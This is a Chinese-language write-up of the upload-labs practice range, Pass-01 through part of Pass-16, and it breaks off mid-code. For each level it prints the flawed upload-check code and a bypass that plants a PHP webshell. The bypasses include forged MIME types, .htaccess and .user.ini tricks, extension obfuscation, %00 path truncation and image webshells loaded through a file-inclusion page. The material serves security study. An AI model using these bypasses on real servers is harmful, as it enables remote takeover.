<font style="color:rgb(25, 27, 31);">upload-labs靶场有较全的文件上传漏洞，借此来练习通过文件上传进行getshell的不同姿势。此次练习配合</font>[《通过文件上传进行Getshell的不同骚姿势》](https://forum.butian.net/share/381)进行食用，相互补充。

# Pass-01
查看源码，发现是通过客户端（JavaScript检测）进行文件类型的校验，只允许上传`.jpg|.png|.gif`这三种类型的文件：

```javascript
function checkFile() {
  var file = document.getElementsByName('upload_file')[0].value;
  if (file == null || file == "") {
    alert("请选择要上传的文件!");
    return false;
  }
  //定义允许上传的文件类型
  var allow_ext = ".jpg|.png|.gif";
  //提取上传文件的类型
  var ext_name = file.substring(file.lastIndexOf("."));
  //判断上传文件类型是否允许上传
  if (allow_ext.indexOf(ext_name + "|") == -1) {
    var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
    alert(errMsg);
    return false;
  }
}
```

代码中可以看到是直接检查最后一个`.`后的类型名，改名`shell.jpg.php`行不通。

由于是由JS进行校验，所以一个思路是直接禁止浏览器使用JavaScript：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757592823978-11e525bb-d0a8-411a-b943-4c63a868357b.png)

上传`shell.php`:

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757639246795-3a2717a6-779f-4abb-bebf-795074a9e864.png)

上传成功。也可以将`shell.php`改名为`shell.jpg`，再通过抓包来改文件类型：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757639343778-5c5d05dd-c975-4510-8443-2223ff3789d2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757639361578-6845e980-f647-41b9-99f8-82d268e70072.png)

上传成功。看到目标目录下有两个文件：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757639482457-b7c732e8-2d91-4e85-8079-280df3a62632.png)

webshell也能连上：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757639621963-910dba77-0cad-4dee-bc84-a7aba0d58713.png)

# Pass-02
查看源码，可以看到这段代码使用`$_FILES['upload_file']['type']`来获取上传文件的MIME类型（服务端检测），确保只有JPEG、PNG和GIF格式的文件可以被上传。

> MIME是一种标准的、用来表示文档、文件、字节流等数据的格式和性质的一种流媒体类型。浏览器通常采用MIME类型而不是文件扩展名来确定如何处理URL和文件内容。所以在响应头需要添加标准的mimetype，否则浏览器将不能以正常的方式来处理解析文件内容。
>
> MIME类型大全可参考：《[MIME类型](https://blog.csdn.net/qq_42482078/article/details/130886050?ops_request_misc=%257B%2522request%255Fid%2522%253A%252208fc1ce8bcd1ef8c49f658e3908a8770%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=08fc1ce8bcd1ef8c49f658e3908a8770&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-130886050-null-null.142^v102^pc_search_result_base8&utm_term=MIME&spm=1018.2226.3001.4187)》
>

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
  if (file_exists(UPLOAD_PATH)) {
    if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
      $temp_file = $_FILES['upload_file']['tmp_name'];
      $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
        if (move_uploaded_file($temp_file, $img_path)) {
        $is_upload = true;
      } else {
        $msg = '上传出错！';
      }
    } else {
      $msg = '文件类型不正确，请重新上传！';
    }
  } else {
    $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
  }
}

```

那么思路也明确了，就是上传`shell.php`，抓包修改`ContentType`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757640661960-04baf0a0-1625-4189-8404-b41ecf976077.png)

上传成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757640682344-c53fe92c-c177-4137-89f7-9b2707a35e33.png)

> 这里有个想法，代码里并没有显式删除上传的错误类型文件，而是在临时文件目录中，那么如果这个临时文件目录有执行权限是不是就可以getshell了？不过`upload_tmp_dir`显示的是`no value`，上传了一个内容为`<?php echo sys_get_temp_dir(); ?>`的`tempdir.php`文件，访问显示`/tmp`，但是这个目录下只有一些PHP会话文件，实在是没有找到这个临时目录在哪，也有可能存在别的删除规则。不过一方面`/tmp`目录本身应该没有执行权限，而且大多数Web服务器默认情况下应该会禁止访问`/tmp`目录中的文件，所以攻击应该不能成功。
>

# Pass-03
查看源码，发现是通过一种黑名单的方式对文件类型进行校验，`.asp`、`.aspx`、`.php`、`.jsp`这几种类型会被禁止上传。黑名单最大的弊端就是容易存在绕过，所以这也是本题的思路。

> 文件上传的绕过可以参考：《[总结一些文件上传的绕过方法](https://www.freebuf.com/articles/web/433766.html)》
>

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

从源码中可以看到，大小写绕过也不好使，所以决定找等价后缀名。

网上找到这几种文件类型的等价后缀名如下：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757648335774-afc54e7b-e12c-4f0e-969d-93a61ccd38a8.png)

不妨将`shell.php`重命名为`shell.php3`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757648416797-d3ab3b7e-454c-4ef6-978d-b9058e20a8ae.png)

上传成功。

> 这里本来尝试查看`httpd.conf`文件，但是Apache2没有，只找到了`/etc/mime.types`，而且其中关于`application/x-httpd-php`的部分都被注释掉了，这是因为现代的Apache配置通常不再直接依赖`mime.types`来处理PHP文件的解析，而是通过`mod_php`或`mod_proxy_fcgi`来处理PHP请求。  
>
> 除此之外，本题如果改成用白名单校验，<font style="color:rgb(36, 41, 47);">可以在满足要求的文件后插入木马脚本语句来绕过，对此，要确保上传目录的文件不可执行。  </font>
>

# Pass-04
从源码中可以看到，黑名单与上一题相比非常完善，而且细数代码逻辑，等价后缀名绕过、大小写绕过、空格绕过、点绕过、`::$DATA`绕过全被处理了，只能考虑下`.htaccess`文件绕过和`.user.ini`文件绕过。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

由于`.user.ini`文件绕过步骤多一点，这里选择`.htaccess`文件绕过。

修改`/etc/apache2/apache2.conf`，把`AllowOverride None`改成`AllowOverride ALL`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757658089705-3c695506-88fa-443f-9e08-e5b98bc2d49a.png)

> <font style="color:rgb(51, 51, 51);">除了这个条件之外，其实还需要</font>`<font style="color:rgb(51, 51, 51);">mod_rewrite</font>`<font style="color:rgb(51, 51, 51);">模块开启，中间件得是Apache，不支持nginx。</font>
>

<font style="color:rgb(51, 51, 51);"> 接下来构建</font>`<font style="color:rgb(51, 51, 51);">.htaccess</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

意思是`.htaccess`文件可以将`shell.jpg`文件当作`php`文件解析执行。由于文本文件不在黑名单内，是可以上传成功的：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757658668053-f1c11817-91e6-4625-b54d-29f516530f45.png)

上传`shell.jpg`，成功后直接getshell成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757658963050-26225782-972b-4047-8791-e58d81e193c4.png)

# Pass-05
这题一看源码，发现连`.htaccess`也在黑名单上，所以决定用`.user.ini`文件绕过。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

> 这种方法也有要求：
>
> 1. PHP版本为5.3以上
> 2. 服务器模式为CGI或FASTCGI模式下（一般指nginx中间件）
> 3. 上传的文件夹有PHP文件，因为这样你上传的文件内容才可以加入PHP文件中执行
>

~~首先~~（首先要以上帝视角在上传的文件目录放一个PHP文件`god.php`）构建`.user.ini`文件：

```plain
auto_prepend_file=shell.jpg
```

意思是在每个PHP文件请求执行前加载指定的文件`shell.jpg`，也就是让所有PHP文件都“自动”包含这个指定的文件。构建好后上传。

然后上传提前准备好的`shell.jpg`，尝试getshell发现失败了，在浏览器新标签页打开刚刚上传的`shell.jpg`，发现被重命名：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757661480690-c5d09a53-535a-4b99-a43c-fe12d8855f80.png)

这意味着刚刚的`.user.ini`也被重命名了，回看源码发现确实有一行重命名的代码`$img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;`，而且从Pass-03开始就有了，检查了下Pass-03上传的文件也会被重命名，但是为什么Pass-04上传的`shell.jpg`没有被重命名呢？而且通过Pass-04上传的`.user.ini`也没有被重命名。怀疑页面展示的源码不是真的源码。。。

进入Pass-04的`index.php`一看，果不其然，弄虚作假：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757663596451-e11f8db1-e654-4a03-8def-8605487c1c57.png)

不管了，先直接把Pass-05的代码也给改了，让这题完结先。

继续回来上传`.user.ini`和`shell.jpg`。还是连不上shell，怎么还有坑。。。又站在上帝视角检查了下，发现Server API是Apache 2.0 Handler，不支持`.user.ini`文件的处理。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757664489546-c3f7c976-8794-4fcd-a50c-167e7600e3dc.png)

尝试改成CGI/Fast CGI太麻烦，要掉进新坑，先跑了。

正常来说连接`http://192.168.159.128:8000/upload/god.php`即可getshell。

回顾源码，发现其实也有别的思路，比如如果在Windows环境，可以用点空格点绕过，上传`shell.php. .`，最后在上传目录中的是`shell.php.`，而在Windows中<font style="color:rgb(51, 51, 51);">文件后缀名最后一个点会被自动去除。</font>

<font style="color:rgb(51, 51, 51);">除此之外，页面显示源码有点问题，没有对后缀名进行强制小写转换，导致存在一些大小写绕过，虽然真源码是有的。。。该靶场版本太多，源码太乱了。</font>

# Pass-06
将这题的源码与之前的进行比对，发现最大的区别是这题没有用`trim($file_ext)`进行首尾去空。所以本题的思路也很明确，就是在扩展名最后加空格绕过黑名单。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
  if (file_exists(UPLOAD_PATH)) {
    $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
    $file_name = $_FILES['upload_file']['name'];
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, '.');
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA

    if (!in_array($file_ext, $deny_ext)) {
      $temp_file = $_FILES['upload_file']['tmp_name'];
      $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
      if (move_uploaded_file($temp_file,$img_path)) {
        $is_upload = true;
      } else {
        $msg = '上传出错！';
      }
    } else {
      $msg = '此文件不允许上传';
    }
  } else {
    $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
  }
}
```

抓包修改文件名，在最后加空格后发送，成功上传：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757918824796-cc2801aa-e733-454c-acda-143d46dfcece.png)

# Pass-07
观察源码，少了删除文件名末尾的点这一步`deldot($file_name)`，所以思路也很明确，就是在文件扩展名最后加个`.`就可以绕过黑名单。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

抓包后加点，上传成功。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757919763521-b1603ff7-6c56-4f30-ba30-a7d821bfa860.png)

不过由于靶场部署在非Windows环境，这个shell是连不上的，因为<font style="color:rgb(51, 51, 51);">Linux系统下，文件后缀名最后一个点不会被自动去除。</font>

# <font style="color:rgb(51, 51, 51);">Pass-08</font>
观察源码，少了去除字符串`::$DATA`这一步`str_ireplace('::$DATA', '', $file_ext);`，所以思路也很明确，就是在文件扩展名最后加`::$DATA`就可以绕过黑名单。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

抓包修改文件名，上传成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757920500098-1eabedf7-4a2f-46e1-ae6a-fda75121a9b0.png)

> 其实这个shell依然只能在Windows系统连上，所以大小写绕过、空格绕过、点绕过、`::DATA`绕过都是只适用于Windows系统的。
>

# Pass-09
观察这题源码，好像该有的校验都有了，一下子没找到绕过的思路。其实是因为在Pass-05的时候就已经把这个思路用了，就是点空格点绕过。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

抓包改名，上传成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757921555898-c8087ddb-015f-4e7e-aeda-197667ca4ccf.png)

不过与点绕过同理，无法连接webshell，因为不是Windows系统。

# Pass-10
这题源码一看非常短，似乎比之前校验少很多有很多可乘之机，实则是因为不需要其他校验了，这里`str_ireplace()`直接进行不区分大小写的字符串替换，将符合黑名单的内容都替换成空字符串。而且要注意这里黑名单的扩展名是不带点号的。到这思路也明确了，就是双写绕过。

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

抓包修改扩展名为`.pphphp`，这样服务端会把中间的`php`给替换成空字符串，剩下`.php`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757922377503-de8557a8-51d2-45bc-ad59-d73d5c81669e.png)

上传成功，路径如下：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757922418390-7d5f0254-8f90-4a78-a24d-2c52df63581f.png)

# Pass-11
这题一看源码，发现用的是白名单校验。白名单校验的四种绕过手法（MIME验证绕过、%00截断绕过、文件头检测绕过、二次渲染绕过）中只有%00截断绕过适用于此题。

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

上传`1.jpg`后抓包：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757926182537-05c20829-487a-4aef-a303-1e87e25f4ae2.png)

可以看到`<font style="color:rgb(77, 77, 77);">save_path</font>`是通过GET传参传递的，修改这部分让路径截断。原来是`save_path=../upload/`，现在修改成`save_path=../upload/1.php%00.jpg`。最后由于后面被截断，文件会被保存为`1.php`。

> 由于00截断有条件如下：
>
> + PHP版本 < 5.3.4
> + `magic_quotes_gpc`配置为Off
>
> 改靶场在部署时PHP是5.5.38，所以会显示上传出错，不过思路应该没有问题。
>

# Pass-12
本题源码与Pass-11的唯一区别在于本题是通过POST传参，参数会放在请求体里传输。

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

上传`1.jpg`后抓包：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757927142980-cc69029a-8b0e-4754-bc70-dffc3ae02e63.png)

将`../upload/`修改为`../upload/2.php,`，这个`,`其实相当与一个占位符，方便等下修改十六进制的时候进行定位：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757927363996-47bda8e9-ad84-4b22-adb6-bb7852bb83d5.png)

这个`2c`就是十六进制的`,`，手动将其修改成`00`，发送请求。最后由于后面被截断，文件会被保存为`2.php`。

> 与Pass-11同理，由于PHP版本问题，会显示上传失败，不过思路应该没有问题。
>

# Pass-13
这题上来就提示要制作图片马，再看看源码，发现确实是通过读取文件头（magic number）判断类型而不是通过扩展名。

```php
function getReailFileType($filename){
  $file = fopen($filename, "rb");
  $bin = fread($file, 2); //只读2字节
  fclose($file);
  $strInfo = @unpack("C2chars", $bin);    
  $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
  $fileType = '';    
  switch($typeCode){      
    case 255216:            
    $fileType = 'jpg';
    break;
    case 13780:            
    $fileType = 'png';
    break;        
    case 7173:            
    $fileType = 'gif';
    break;
    default:            
    $fileType = 'unknown';
  }    
  return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
  $temp_file = $_FILES['upload_file']['tmp_name'];
  $file_type = getReailFileType($temp_file);

  if($file_type == 'unknown'){
    $msg = "文件未知，上传失败！";
  }else{
    $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
    if(move_uploaded_file($temp_file,$img_path)){
      $is_upload = true;
    } else {
      $msg = "上传出错！";
    }
  }
}
```

这里使用古老的edjpgcom.exe来制作图片马：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757994658694-a48d9ffe-c6ba-40ad-ab55-3df065b6d09d.png)

上传这个图片马：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757994768916-a5a35728-f01d-4509-9fe6-d018bc0fbf9e.png)

利用页面的文件包含漏洞来调用，文件包含漏洞如下：

```php
 <?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
header("Content-Type:text/html;charset=utf-8");
$file = $_GET['file'];
if(isset($file)){
    include $file;
}else{
    show_source(__file__);
}
?> 
```

所以构造URL形如`http://192.168.159.128:8000/include.php?file=upload/4620250916035229.jpg`，成功解析：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757994960836-d4d5d0be-d28b-4dd0-bef1-fcc08593865b.png)

通过webshell管理工具连接，getshell成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757995280675-081f5908-e923-4539-b524-2f6ab444169e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757995251303-755ff8d3-4c4b-4fe2-b0f0-791d7517c3cd.png)

# Pass-14
这题的源码比上一题短了不少，但是其实逻辑是差不多的，只是用了`getimagesize()`函数来获取文件头。

```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

直接上传上一题的图片马就能过。

# Pass-15
这题与前两题没区别，只是获取文件类型的方式不同，用之前的图片马依然能过。

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

# Pass-16
这题的代码比较特别，可以看到是对原来的图片进行了二次渲染，<font style="color:rgb(36, 41, 47);">相当于是把原本属于图像数据的部分抓了出来，再用自己的API或函数进行重新渲染，在这个过程中非图像数据的部分直接就隔离开了。</font>

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagejpeg($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path))
        {
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                $newimagepath = UPLOAD_PATH.$newfilename;
                imagepng($im,$newimagepath);
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.$newfilename;
                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

